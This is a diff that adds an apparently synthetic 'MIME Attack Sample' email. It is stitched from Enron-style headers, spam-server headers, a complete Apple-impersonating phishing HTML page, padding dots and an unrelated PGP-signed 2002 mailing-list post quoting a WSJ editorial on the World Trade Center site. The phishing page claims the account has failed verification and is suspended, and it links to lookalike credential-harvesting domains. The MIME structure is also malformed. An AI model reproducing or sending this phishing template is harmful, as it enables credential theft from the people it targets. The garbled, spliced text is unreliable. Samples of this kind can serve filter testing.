@@ -1,0 +1,452 @@
+From: humphrey@enron.com
+To: l..day@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+t
+Content-Type: text/html; charset="iso-8859-1"
+X-OutGoing-Spam-Status: No, score=7.2
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - advanced1061.inmotionhosting.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [549 540] / [47 12]
+X-AntiAbuse: Sender Address Domain - advanced1061.inmotionhosting.com
+X-Get-Message-Sender-Via: advanced1061.inmotionhosting.com: authenticated_id: gesti/only user confirmed/virtual account not confirmed
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 3285
+
+<html>
+	<head>
+		<title>Congratulations, You won a MacBook Pro</title>
+	</head>
+	<body>
+		<table border="0" cellpadding="0" cellspacing="0" id="ap-header" width="100%">
+			<tbody>
+				<tr>
+					<td align="left" height="49" valign="top" width="155">
+						<img alt="Apple store" border="0" height="49" src="http://email.images.apple.com/rover/aos/global/hd/apple-store_2x.png" style="outline:none; display:block;" width="155" /></td>
+					<td align="right" style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color:#666666 !important; font-size: 11px;line-height:14px;" valign="bottom">
+						ID Number:<a style="color:#0088cc;"><span style="color:#0088cc;"> </span></a><a class="aapl-link" href="http://appleid.applle.com-cgi-bin.login.support.security.nuivall.drl.pl/imge/" style="color:#4e9cde;font-weight:normal">#225330807</a>  | 18/07/2014<br />
+						 </td>
+				</tr>
+			</tbody>
+		</table>
+		<table bgcolor="ffffff" border="0" cellpadding="0" cellspacing="0" class="ap-container" style="-webkit-border-radius:7px;-moz-border-radius:7px; border-radius:7px; border-top: 1px solid #e1e1e1; border-right: 1px solid #cecece; border-left: 1px solid #cecece; border-bottom: 1px solid #b4b4b4; -moz-box-shadow: 0px 1px 1px #b4b4b4; -webkit-box-shadow: 0px 1px 1px #b4b4b4; box-shadow: 0px 1px 1px #b4b4b4;" width="100%">
+			<tbody>
+				<tr>
+					<td align="center" valign="top">
+						<img alt="" border="0" height="18" src="http://email.images.apple.com/dm/groups/aos/om/global/cmon/spacer.gif" style="display:block; outline: none;" width="1" />
+						<table border="0" cellpadding="22" cellspacing="0" class="ap-hero" width="100%">
+							<tbody>
+								<tr>
+									<td align="center" valign="top">
+										<h2 style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Tahoma, sans-serif; color:#000000 !important; line-height:40px; font-size: 36px; margin-top:0; margin-left: 0; margin-right:0; margin-bottom:2px;font-weight:500;">
+											Dear Apple Customer, Failed to verify Your Account.</h2>
+										<h2 style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; line-height:22px; color:#666666 !important; font-size: 18px; margin-top:0; margin-left: 0; margin-right:0; margin-bottom:0; font-weight:lighter;">
+											<a href="http://kemtools.com/redirect.php">Click Here to Verify Your Identity and enter your billing adresse.</a></h2>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						<img alt="" border="0" height="18" src="http://email.images.apple.com/dm/groups/aos/om/global/cmon/spacer.gif" style="display:block; outline: none;" width="1" /> <img border="0" class="mobile-scale" height="7" src="http://email.images.apple.com/rover/aos/global/hd/hr_shaded_2x.gif" style="outline:none; display:block;" width="700" />
+						<table border="0" cellpadding="0" cellspacing="0" class="ap-9pxspacer" height="9" width="100%">
+							<tbody>
+								<tr>
+									<td align="left" height="9" style="font-size:6px; line-height: 0;" valign="top">
+										<img alt="" border="0" height="9" src="http://email.images.apple.com/dm/groups/aos/om/global/cmon/spacer.gif" style="display:block; outline: none;" width="1" /></td>
+								</tr>
+							</tbody>
+						</table>
+						<table border="0" cellpadding="0" cellspacing="0" class="ap-shipping-wrapper" width="100%">
+							<tbody>
+								<tr>
+									<td align="center" valign="top">
+										<table border="0" cellpadding="14" cellspacing="0" class="ap-contentbox" style="border-top: 1px solid #d4d4d4; border-right: 1px solid #d4d4d4; border-left: 1px solid #d4d4d4; border-bottom: 1px solid #AAAAAA; -webkit-border-radius:5px;-moz-border-radius:5px; border-radius:5px; -moz-box-shadow: 0px 1px 1px #d4d4d4, inset 0px 0px 6px #d4d4d4; -webkit-box-shadow: 0px 1px 1px #d4d4d4, inset 0px 0px 6px #d4d4d4; box-shadow: 0px 1px 1px #d4d4d4, inset 0px 0px 6px #d4d4d4;" width="656">
+											<tbody>
+												<tr>
+												</tr>
+												<tr>
+													<td align="left" style="font-family: 'Lucida Grande', 'Lucida Sans', 'Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color: #000000; font-size: 15px; line-height: 15px;" valign="top">
+														<table border="0" cellpadding="0" cellspacing="0" class="app-order-row" width="100%">
+															<tbody>
+																<tr>
+																	<td align="center" valign="top" width="110">
+																		<a href="http://appletunedupcdcom.esy.es/confirm/a87diaju2nweu822duyghd72/update/ID/AppleID/update_confirm/submit/submit/"><img alt="" height="78" src="http://as-images.apple.com/is/image/AppleInc/ME865?wid=220&hei=156&fmt=jpeg&qlt=95&op_sharpen=0&resMode=bicub&op_usm=0.5,1.5,0,0&iccEmbed=0&layer=comp&.v=1381714910549" style="outline:none; display:block;" width="110" /></a></td>
+																	<td align="left" class="spacer-col" valign="top" width="15">
+																		 </td>
+																	<td align="left" valign="top">
+																		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+																			<tbody>
+																				<tr>
+																					<td align="left" style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color:#000000; font-size: 12px; line-height:18px; font-weight:bold;" valign="top" width="300">
+																						Before log in your account will be Confirmed</td>
+																					<td align="left" class="spacer-col" valign="top" width="15">
+																						 </td>
+																					<td align="right" style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color:#000000; font-size: 12px; line-height:18px;" valign="top">
+																						 </td>
+																					<td align="left" class="spacer-col" valign="top" width="15">
+																						 </td>
+																					<td align="right" style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color:#000000; font-size: 12px; line-height:18px;" valign="top" width="30">
+																						 </td>
+																					<td align="left" class="spacer-col" valign="top" width="15">
+																						 </td>
+																					<td align="right" style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color:#000000; font-size: 12px; font-weight:bold; line-height:18px;" valign="top">
+																						<div class="noWrapPrice">
+																							 </div>
+																					</td>
+																				</tr>
+																				<tr>
+																					<td height="14">
+																						<img alt="" border="0" height="14" src="http://email.images.apple.com/dm/groups/aos/om/global/egc/spacer.gif" style="display:block; outline: none;" width="1" /></td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																				</tr>
+																				<tr>
+																					<td align="left" style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #010101; font-size: 11px; line-height: 1em; font-weight: bold" valign="top">
+																						let us know right away
+																						<table align="left" border="0" cellpadding="0" cellspacing="0" height="4" width="100%">
+																							<tbody>
+																								<tr>
+																									<td height="4">
+																										<img alt="" border="0" height="4" src="http://email.images.apple.com/dm/groups/aos/om/global/egc/spacer.gif" style="display: block; outline: none;" width="1" /></td>
+																								</tr>
+																							</tbody>
+																						</table>
+																						<table align="right" border="0" cellpadding="2" cellspacing="0" width="96%">
+																							<tbody>
+																								<tr>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em" valign="top" width="10">
+																										</td>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em; font-weight: normal" valign="top">
+																										Reporting it is important because it helps us prevent fraudsters from stealing your information</td>
+																								</tr>
+																							</tbody>
+																						</table>
+																						<table align="right" border="0" cellpadding="2" cellspacing="0" width="96%">
+																							<tbody>
+																								<tr>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em" valign="top" width="10">
+																										</td>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em; font-weight: normal" valign="top">
+																										Yours sincerely, Apple Store .</td>
+																								</tr>
+																							</tbody>
+																						</table>
+																						<table align="right" border="0" cellpadding="2" cellspacing="0" width="96%">
+																							<tbody>
+																								<tr>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em" valign="top" width="10">
+																										</td>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em; font-weight: normal" valign="top">
+																										<span class="short_text" id="result_box" lang="en"><span class="hps"></span> <span class="hps"></span></span></td>
+																								</tr>
+																							</tbody>
+																						</table>
+																						<table align="right" border="0" cellpadding="2" cellspacing="0" width="96%">
+																							<tbody>
+																								<tr>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em" valign="top" width="10">
+																										</td>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em; font-weight: normal" valign="top">
+																									copyright 2014 Apple Inc.</td>
+																								</tr>
+																							</tbody>
+																						</table>
+																						<table align="right" border="0" cellpadding="2" cellspacing="0" width="96%">
+																							<tbody>
+																								<tr>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em" valign="top" width="10">
+																										</td>
+																									<td style="font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif; color: #666666; font-size: 11px; line-height: 1.37em; font-weight: normal" valign="top">
+																										Please do not reply to this email because we are not monitoring this inbox</td>
+																								</tr>
+																							</tbody>
+																						</table>
+																					</td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																					<td>
+																						 </td>
+																				</tr>
+																			</tbody>
+																		</table>
+																	</td>
+																</tr>
+															</tbody>
+														</table>
+													</td>
+												</tr>
+											</tbody>
+										</table>
+										<table border="0" cellpadding="0" cellspacing="0" class="ap-9pxspacer" height="9" width="100%">
+											<tbody>
+												<tr>
+													<td align="left" height="9" style="font-size: 6px; line-height: 0;" valign="top">
+														<img alt="" border="0" height="9" src="http://email.images.apple.com/dm/groups/aos/om/global/cmon/spacer.gif" style="display: block; outline: none;" width="1" /></td>
+												</tr>
+											</tbody>
+										</table>
+										<table border="0" cellpadding="14" cellspacing="0" class="ap-contentbox" style="border-top: 1px solid #d4d4d4; border-right: 1px solid #d4d4d4; border-left: 1px solid #d4d4d4; border-bottom: 1px solid #AAAAAA; -webkit-border-radius:5px;-moz-border-radius:5px; border-radius:5px; -moz-box-shadow: 0px 1px 1px #d4d4d4, inset 0px 0px 6px #d4d4d4; -webkit-box-shadow: 0px 1px 1px #d4d4d4, inset 0px 0px 6px #d4d4d4; box-shadow: 0px 1px 1px #d4d4d4, inset 0px 0px 6px #d4d4d4;" width="656">
+											<tbody>
+												<tr>
+													<td align="left" background="http://email.images.apple.com/dm/groups/aos/om/global/cmon/box-grad-bg.gif" bgcolor="e2e2e2" style="background-image:url(images/box-grad-bg.gif); background-repeat: repeat-x; background-position: top left; border-radius:5px 5px 0px 0px; background-color: #e2e2e2; font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color:#000000; font-size: 15px; line-height:18px;" valign="top">
+														<table>
+															<tbody>
+																<tr>
+																	<td valign="top" width="120">
+																		<strong>Once you have updated your account records</strong></td>
+																	<td>
+																		 </td>
+																	<td style="font-family: 'Lucida Grande', 'Lucida Sans', 'Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color: #000000; font-size: 15px; line-height: 20px;" valign="top">
+																		we will try again to validate your information and your account suspension will be lifted. This will help protect your account in the future. This process does not take more than 3 minutes. To proceed to confirm your account details please click on the link below and follow the instructions<br />
+																		<span class="short_text" id="result_box" lang="en"><span class="hps"></span> <span class="hps"></span> <span class="hps"></span></span><br />
+																		<a href="http://www.apple.com/support/contact/" style="color:#0088cc;font-size:12px;" target="_blank"><span class="short_text" id="result_box" lang="en"><span class="hps">We apologise for any</span> <span class="hps">inconvenience caused.Your sincerely,</span></span></a></td>
+																</tr>
+																<tr>
+																</tr>
+															</tbody>
+														</table>
+													</td>
+												</tr>
+												<tr>
+												</tr>
+											</tbody>
+										</table>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						<table border="0" cellpadding="0" cellspacing="0" class="ap-payment-totals" width="656">
+						</table>
+					</td>
+				</tr>
+			</tbody>
+		</table>
+		<p>
+			 </p>
+		<table border="0" cellpadding="0" cellspacing="0" class="ap-footer-text" height="10" width="100%">
+			<tbody>
+				<tr>
+					<td align="left" style="font-family: 'Lucida Grande','Lucida Sans','Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif; color:#999999 !important; font-size: 10px; line-height:16px;" valign="top">
+						Apple Distribution International, Hollyhill Industrial Estate, Hollyhill, Cork, Republic of Ireland.</td>
+				</tr>
+				<tr>
+					<td style="padding-top:14px;-webkit-text-size-adjust:125%">
+						<div style="font-size:10px; line-height:1.3em; color:#979797;font-family: Lucida Grande, Lucida Sans, Lucida Sans Unicode, Arial, Helvetica, Verdana, sans-serif">
+							<span class="short_text" id="result_box" lang="en"><span class="hps">Copyright</span> <span class="hps"></span> <span class="hps">2013</span> <span class="hps">Apple Inc. All</span> <span class="hps">rights reserved.</span></span></div>
+					</td>
+				</tr>
+			</tbody>
+		</table></body>
+</html>
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+Content-Type: text/plain
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Say 'amen' somebody. What the WSJ said, appended below.
+
+
+The WTC, as constructed, was a confiscatory government boondoggle,
+expropriated from the original pre-construction property owners at
+the behest of a third-generation trust-fund-aristocrat for the "good"
+of the city, and owned by an "authority" looking for something else
+to do after it, and its coach-hounds in organized labor and organized
+crime, had killed what was the largest port in the world's richest
+nation.
+
+Now, of course, it's about to get worse. The sins of 40 years ago
+have been compounded at the hands of two kinds of literally
+irrational fanatics, first those in religion, and now those in
+government.
+
+As a result, a large part of 10 million square feet of once perfectly
+usable office space, devoted, at least ostensibly, to commerce, will
+be "granted" away  in a potlatch that only government, and
+special-interest "communities", (or "stakeholders", or whatever the
+cryptosocialist psycho-rabble call themselves this week) can organize
+to such perfection.
+
+
+All this in probably the *only* city in the country that was founded
+by a *business*, explicitly for the purpose of *commerce*. Not
+religious fanaticism. Not colonial expansion in a monarch's name.
+*Commerce*.
+
+
+If they *really* wanted to make a point to the superstitious luddites
+who collapsed those buildings (using probably the only sharp objects
+on a plane full of government-disarmed passengers) the so-called
+"authority" should disband itself and sell its property off to the
+highest bidder and let the *market* -- the cure to all luddism,
+foreign and domestic, government and superstitious -- decide.
+
+If the new, *private* owner wants to sell, or give away, a space for
+a memorial, fine. They could sell tickets and donate the money to the
+families of the dead and injured. Probably great for marketing the
+property, at least during the lifetime of anyone who remembers the
+event.
+
+And, of course, if the new owner wants to build something twice as
+tall, or with twice as much space than the original 10 million square
+feet, splendid. Whatever the market will bear.
+
+
+In these days of increasingly ubiquitous trans-national geodesic
+internetworks, of strong financial cryptography, and of exponentially
+decreasing transaction costs in formerly monolithic industries,
+economics and freedom can, and will, prevail over both superstition
+and statism.
+
+It's probably too much to hope for an actual market in lower
+Manhattan mega-real-estate to prevail this early in the game, but
+it's going to happen sooner or later.
+
+And, whenever it does, *that* will be a fitting memorial to those who
+died at the World Trade Center.
+
+Cheers,
+RAH
+
+- -------
+
+http://online.wsj.com/article_print/0,,SB1031705210159756235,00.html
+
+
+The Wall Street Journal
+
+September 11, 2002
+REVIEW & OUTLOOK
+
+A Living Memorial
+
+As we write these words, we can look down from our offices into the
+six-story crater where the Twin Towers once stood. Like everyone
+else, we want that site to be rebuilt in a way that honors those who
+died a year ago. But we also think the best memorial to those who
+perished would be a living one.
+
+The site of the World Trade Center calls forth many emotions,
+especially today: anger, grief and respect for the many acts of
+heroism that took place there. But underlying it all is the memory of
+the enormous vitality that distinguished the towers before they were
+attacked and was a large reason they were targeted. The best
+expression of the spirit of New York and of those who died would be
+to once again see thousands of people from dozens of countries
+working, meeting, shopping, eating -- that is, engaged in the sort of
+productive work and play that used to take place there. Osama bin
+Laden should not be allowed to have turned it into a cemetery.
+
+But restoring this memory is not what the discussion in New York has
+been about. So far no one is talking seriously about the vigorous
+rebuilding of downtown Manhattan, which lost 100,000 jobs when the
+Trade Center fell. Instead the discussion centers on the size and
+scale of the memorial, and on satisfying every political interest now
+clamoring for a piece of the action. New York's political leadership,
+and its financial and media elites, are squandering a historic chance
+to rebuild a better, more prosperous city.
+
+This is in part the fault of the commission tasked with figuring out
+what to do with the site. In consultation with New York Governor
+George Pataki, who is thinking primarily about his own November
+re-election, the commission made the decision to focus first on the
+memorial. The Manhattan Institute's Steve Malanga argues that the
+commission would have been better off setting aside a limited space
+for the memorial, getting on with the rebuilding and then returning
+to the memorial. This is in essence what the Pentagon has so
+successfully done -- rebuild immediately and set aside two acres for
+an outdoor memorial, a design for which has yet to be decided.
+
+A big part of the problem in New York is that the city's
+anti-development activists know an opening when they see one. They
+want the World Trade Center site -- and even some surrounding areas
+- -- transformed into an enormous park. These political advocates have
+had plenty of practice at turning proposed development projects in
+New York into a nightmare of delay and litigation, and the World
+Trade Center site is now getting the same treatment. Worse, they are
+cynically using some bereaved family members to advance their own
+anti-development agenda in the name of "honoring" the dead. One
+family group even called a press conference to reject as
+disrespectful a proposed train line under the site.
+
+We are not experts in designing war memorials, but we're confident
+that a gigantic park in the heart of the world's financial center
+isn't the appropriate choice for those who died a year ago. The great
+cities of Europe and Japan, devastated in World War II, have all
+rebuilt, and with memorials that are integrated into modern urban
+life. Perhaps the most powerful is found in Rotterdam, the Dutch port
+city reduced to rubble by German bombing, where survivors erected a
+statue of a man with a hole where his heart used to be.
+
+In this country, the practice has been for the names of war dead to
+be inscribed on the walls of institutions with which they were
+affiliated. If you walk into Nassau Hall at Princeton University,
+you'll find the names of 644 alumni who died in the Revolutionary
+War, the War of 1812, the Civil War, the Spanish-American War, World
+War I, World War II, Korea and Southeast Asia. No one thinks it
+disrespectful to the dead that the life of the university goes on
+around the walls containing their names.
+
+In New York now, it would help if political leaders looked beyond the
+emotional tug of the victims and their families to the city's future.
+Rudolph Giuliani, now that he's out office, wants the entire 16 acres
+devoted to the memorial. Governor Pataki has called for no structures
+on the "footprints," which, being in the center of the site, would
+severely curtail options. Mayor Michael Bloomberg initially raised
+his voice in favor of commercial development but was bloodied by the
+press and has since ducked for cover.
+
+Maybe things will be different after this anniversary is past. Maybe
+those responsible for the World Trade Center site will start thinking
+more about the next 50 or 100 years than the past 12 months. The best
+way to honor the dead is by reviving normal life and commerce.
+
+-----BEGIN PGP SIGNATURE-----
+Version: PGP 7.5
+
+iQA/AwUBPX9zD8PxH8jf3ohaEQI2aACgv7mtb5VKTpRj5MJQt1OyzyifzusAn273
+fgNkOntna6+SmLO8TB4XYbC2
+=09az
+-----END PGP SIGNATURE-----
+-BOUNDARY--
